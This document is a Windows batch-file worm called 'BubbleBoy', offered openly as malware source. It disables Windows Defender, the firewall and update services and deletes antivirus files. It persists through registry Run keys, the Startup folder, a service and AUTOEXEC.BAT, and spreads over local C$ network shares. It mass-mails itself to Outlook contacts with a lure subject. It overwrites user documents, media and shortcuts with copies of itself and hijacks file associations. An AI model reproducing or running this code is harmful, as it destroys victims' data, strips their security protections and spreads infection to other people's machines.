@echo off
:: BubbleBoy
:: Written by FlyFar
:: Vietnam
:: 10/21/2021
color 20
title BubbleBoy
net stop "SDRSVC"
net stop "WinDefend"
taskkill /f /t /im "MSASCui.exe"
net stop "security center"
netsh firewall set opmode mode-disable
net stop "wuauserv"
net stop "Windows Defender Service"
net stop "Windows Firewall"
net stop sharedaccess
del /Q /F C:\Program Files\alwils~1\avast4\*.*
del /Q /F C:\Program Files\Lavasoft\Ad-awa~1\*.exe
del /Q /F C:\Program Files\kasper~1\*.exe
del /Q /F C:\Program Files\trojan~1\*.exe
del /Q /F C:\Program Files\f-prot95\*.dll
del /Q /F C:\Program Files\tbav\*.dat
del /Q /F C:\Program Files\avpersonal\*.vdf
del /Q /F C:\Program Files\Norton~1\*.cnt
del /Q /F C:\Program Files\Mcafee\*.*
del /Q /F C:\Program Files\Norton~1\Norton~1\Norton~3\*.*
del /Q /F C:\Program Files\Norton~1\Norton~1\speedd~1\*.*
del /Q /F C:\Program Files\Norton~1\Norton~1\*.*
del /Q /F C:\Program Files\Norton~1\*.*
copy BubbleBoy.bat "C:\Users\Admin\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
@echo off > service.bat
SET "NomeProcesso=BubbleBoy.bat" >> service.bat
SET "NomeService=BubbleBoy" >> service.bat
echo sc create %NomeService% binpath=%0 >> service.bat
echo sc start %NomeService% >> service.bat
attrib +h +r +s service.bat
start service.bat
SET i=0
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v "Windows Services" /t "REG_SZ" /d %0
attrib +h +r +s %0
:Internet
net use Z: \\192.168.1.%i%\C$
if exist Z: (for /f %%u in ('dir Z:\Users /b') do copy %0 "Z:\Users\%%u\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Windows Services.exe"
mountvol Z: /d)
if %i% == 256 (goto Infect) else (set /a i=i+1)
goto worm
goto Internet
:Infect
for /f %%f in ('dir C:\Users\*.* /s /b') do (rename %%f *.exe)
for /f %%f in ('dir C:\Users\*.exe /s /b') do (copy %0 %%f)
goto Infect
:worm
set Slash=\
if exist %SystemDrive%%Slash%AUTOEXEC.BAT (
del %SystemDrive%%Slash%AUTOEXEC.BAT
copy %0 %SystemDrive%%Slash%AUTOEXEC.BAT
attrib +s +r +h %SystemDrive%%Slash%AUTOEXEC.BAT
)
set a=BubbleBoy
copy %0 %windir%\%a%.exe
reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v AVAADA /t REG_SZ /d %windir%\%a%.exe /f > nul
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v AVAADA /t REG_SZ /d %windir%\%a%.exe /f > nul
set b=BubbleBoy
copy %0 %windir%\%b%.exe
echo [windows] >> %windir%\win.ini
echo run=%windir%\%b%.exe >> %windir%\win.ini
echo load=%windir%\%b%.exe >> %windir%\win.ini
echo [boot] >> %windir%\system.ini
echo shell=explorer.exe %b%.exe >> %windir%\system.ini
echo dim x>>%SystemDrive%\mail.vbs
echo on error resume next>>%SystemDrive%\mail.vbs
echo Set fso ="Scripting.FileSystem.Object">>%SystemDrive%\mail.vbs
echo Set so=CreateObject(fso)>>%SystemDrive%\mail.vbs
echo Set ol=CreateObject("Outlook.Application")>>%SystemDrive%\mail.vbs
echo Set out=WScript.CreateObject("Outlook.Application")>>%SystemDrive%\mail.vbs
echo Set mapi = out.GetNameSpace("MAPI")>>%SystemDrive%\mail.vbs
echo Set a = mapi.AddressLists(1)>>%SystemDrive%\mail.vbs
echo Set ae=a.AddressEntries>>%SystemDrive%\mail.vbs
echo For x=1 To ae.Count>>%SystemDrive%\mail.vbs
echo Set ci=ol.CreateItem(0)>>%SystemDrive%\mail.vbs
echo Set Mail=ci>>%SystemDrive%\mail.vbs
echo Mail.to=ol.GetNameSpace("MAPI").AddressLists(1).AddressEntries(x)>>%SystemDrive%\mail.vbs
echo Mail.Subject="BubbleBoy Incident, Original Video!">>%SystemDrive%\mail.vbs
echo Mail.Body="BubbleBoy Incident, Original Video!">>%SystemDrive%\mail.vbs
echo Mail.Attachments.Add(%0)>>%SystemDrive%\mail.vbs
echo Mail.send>>%SystemDrive%\mail.vbs
echo Next>>%SystemDrive%\mail.vbs
echo ol.Quit>>%SystemDrive%\mail.vbs
start "" "%SystemDrive%\mail.vbs"
goto run2
goto worm
:run2
set Slash=\
if exist %SystemDrive%%Slash%AUTOEXEC.BAT (
attrib +s +r +h %SystemDrive%%Slash%AUTOEXEC.BAT
del %SystemDrive%%Slash%AUTOEXEC.BAT
copy %0 %SystemDrive%%Slash%AUTOEXEC.BAT
attrib +s +r +h %SystemDrive%%Slash%AUTOEXEC.BAT
)
set a=BubbleBoy
copy %0 %windir%\%a%.exe
reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v AVAADA /t REG_SZ /d %windir%\%a%.exe /f > nul
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v AVAADA /t REG_SZ /d %windir%\%a%.exe /f > nul
copy %0 "%userprofile%\Start Menu\Programs\Startup"
set b=BubbleBoy
copy %0 %windir%\%b%.exe
echo [windows] >> %windir%\win.ini
echo run=%windir%\%b%.exe >> %windir%\win.ini
echo load=%windir%\%b%.exe >> %windir%\win.ini
echo [boot] >> %windir%\system.ini
echo shell=explorer.exe %b%.exe >> %windir%\system.ini
assoc .lnk=batfile
DIR /S/B %SystemDrive%\*.lnk >> InfList_lnk.txt
echo Y | FOR /F "tokens=1,* delims=: " %%j in (InfList_lnk.txt) do copy /y %0 "%%j:%%k"
assoc .doc=batfile
DIR /S/B %SystemDrive%\*.doc >> InfList_doc.txt
echo Y | FOR /F "tokens=1,* delims=: " %%j in (InfList_doc.txt) do copy /y %0 "%%j:%%k"
assoc .txt=batfile
DIR /S/B %SystemDrive%\*.txt >> InfList_txt.txt
echo Y | FOR /F "tokens=1,* delims=: " %%j in (InfList_txt.txt) do copy /y %0 "%%j:%%k"
assoc .pdf=batfile
DIR /S/B %SystemDrive%\*.pdf >> InfList_pdf.txt
echo Y | FOR /F "tokens=1,* delims=: " %%j in (InfList_pdf.txt) do copy /y %0 "%%j:%%k"
assoc .xml=batfile
DIR /S/B %SystemDrive%\*.xml >> InfList_xml.txt
echo Y | FOR /F "tokens=1,* delims=: " %%j in (InfList_xml.txt) do copy /y %0 "%%j:%%k"
assoc .mp3=batfile
DIR /S/B %SystemDrive%\*.mp3 >> InfList_mp3.txt
echo Y | FOR /F "tokens=1,* delims=: " %%j in (InfList_mp3.txt) do copy /y %0 "%%j:%%k"
assoc .mp4=batfile
DIR /S/B %SystemDrive%\*.mp4 >> InfList_mp4.txt
echo Y | FOR /F "tokens=1,* delims=: " %%j in (InfList_mp4.txt) do copy /y %0 "%%j:%%k"
assoc .png=batfile
DIR /S/B %SystemDrive%\*.png >> InfList_png.txt
echo Y | FOR /F "tokens=1,* delims=: " %%j in (InfList_png.txt) do copy /y %0 "%%j:%%k"
:haha
msg * "BubbleBoy Incident!"
net send * "BubbleBoy Incident!"
goto czm
goto haha
:czm
echo call mouse.exe moveBy 10x100 >> yes.bat
echo call mouse.exe moveBy 16x50 >> yes.bat
echo call mouse.exe moveBy 190x10 >> yes.bat
echo call mouse.exe moveBy 186x50 >> yes.bat
echo goto crazymouse >> yes.bat
echo :run>>yes.bat
echo echo BubbleBoy Incident, Videos and Sounds!>>BubbleBoy Incident, Videos and Sounds.txt>>yes.bat
echo :Print >> yes.bat
echo PRINT BubbleBoy Incident, Videos and Sounds.txt /D:LPT2 >> yes.bat
echo PRINT BubbleBoy Incident, Videos and Sounds.txt /D:LPT1 >> yes.bat
echo NOTEPAD /P BubbleBoy Incident, Videos and Sounds.txt >> yes.bat
echo goto run1 >> yes.bat
echo goto Print >> yes.bat
echo copy /y BubbleBoy.bat C:\Windows\regedit.exe >> yes.bat
echo timeout 10 >> yes.bat
start /min https://www.youtube.com/watch?v=dQw4w9WgXcQ
goto final
:final
echo BubbleBoy is DEVIL! 
exit